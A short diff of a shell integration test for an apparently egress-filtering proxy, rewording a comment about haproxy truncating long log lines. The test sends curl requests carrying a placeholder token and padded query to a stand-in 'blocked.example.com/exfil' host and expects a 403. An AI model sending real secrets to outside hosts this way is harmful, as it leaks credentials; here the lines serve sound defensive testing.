@@ -147,10 +147,10 @@ echo "=== [Blocked host - the full URL, incl. query, is what gets recorded] ==="
 CODE=$($C "https://blocked.example.com/exfil?token=SECRET-VALUE")
 check_status "GET blocked.example.com/exfil?token=..." "$CODE" "403"
 
-# A release asset's signed URL runs to about a kilobyte, which is past the
-# length haproxy truncates a log line at by default. A truncated line matches
-# nothing, so this refusal used to leave no trace in the report at all. The
-# marker is last, so finding it proves the whole line survived.
+# A release asset's signed URL runs to about a kilobyte, past the length
+# haproxy cuts a log line at by default. The marker is last on the logged line,
+# so the assertion in integration-test-inspect-restrict.sh finding it proves
+# the whole line was recorded.
 echo "=== [Blocked host - a URL the size a signed one really is] ==="
 PAD=$(awk 'BEGIN{s="";while(length(s)<1200)s=s "A";print s}')
 CODE=$($C "https://blocked.example.com/exfil?pad=$PAD&end=TAIL-MARKER")
